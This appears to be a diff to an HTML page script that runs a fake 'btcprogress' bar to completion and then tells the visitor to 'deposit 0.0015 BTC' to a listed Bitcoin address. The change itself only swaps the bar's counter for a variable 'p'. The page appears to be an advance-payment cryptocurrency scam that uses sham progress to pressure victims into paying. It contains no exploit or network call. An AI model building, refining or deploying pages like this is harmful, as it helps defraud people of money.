@@ -23,6 +23,7 @@
 <div style="position: absolute; left: 128px; top: 144px"id="div3"></div>
 <script>
 setTimeout(()=>{
+    p=0
     name="uknown"
     div1.color="white"
     div1.style.fontSize=32
@@ -34,8 +35,9 @@ setTimeout(()=>{
         div2.innerHTML='<progress id="btcprogress"value="0"max="10000"></progress>'
         click.disabled=true
         setInterval(()=>{
-            btcprogress.value++
-            if(10000<btcprogress.value){
+            p++
+            btcprogress.value=p
+            if(10000<p){
                 console.log("Progress completed!")
                 div3.innerHTML="To continue deposit 0.0015 BTC to this address:<br>1AkrWUFdaMB457PzomDFuKv7L9WAjx2hHu"
             }
